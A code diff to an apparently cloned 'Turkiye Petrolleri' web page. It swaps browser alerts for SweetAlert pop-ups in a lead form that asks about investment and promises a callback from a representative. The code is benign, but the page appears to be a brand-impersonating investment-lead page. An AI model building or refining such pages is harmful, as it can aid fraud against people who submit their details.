@@ -210,7 +210,7 @@
 <script src="./Turkiye Petrolleri_files/bootstrap.min.js.indir"></script>
 <script src="./Turkiye Petrolleri_files/mask.js.indir"></script>
 <script src="./Turkiye Petrolleri_files/custom.js.indir"></script>
-
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
 <script>
 $(document).ready(function () {
     $.mask.definitions['9'] = false;
@@ -240,7 +240,11 @@ $(document).ready(function () {
 
             if (yatirimVarMi === "") {
                 // Eğer bir seçenek seçilmediyse, formun submitini engelle
-                alert("Lütfen yatırım var mı? seçeneğini belirtin.");
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Hata!',
+                    text: 'Lütfen yatırım var mı? seçeneğini belirtin.'
+                });
                 OK = false;
             }
 
@@ -272,7 +276,15 @@ $(document).ready(function () {
                             if (data.data.autologin) {
                                 localStorage.setItem('autologin', data.data.autologin)
                             }
-                            window.location.href = "./thanks.html";
+                            // SweetAlert ile başvuru alındı mesajı göster
+                            Swal.fire({
+                                icon: 'success',
+                                title: 'Başarılı!',
+                                text: 'Başvurunuz alınmıştır. Temsilcimiz en kısa sürede sizi arayacaktır.'
+                            }).then((result) => {
+                                // Yönlendirme işlemi
+                                window.location.href = "./thanks.html";
+                            });
                         } else {
                             toastr.error(data.message)
                             $(this).find('button[type=submit]').attr("disabled", false);
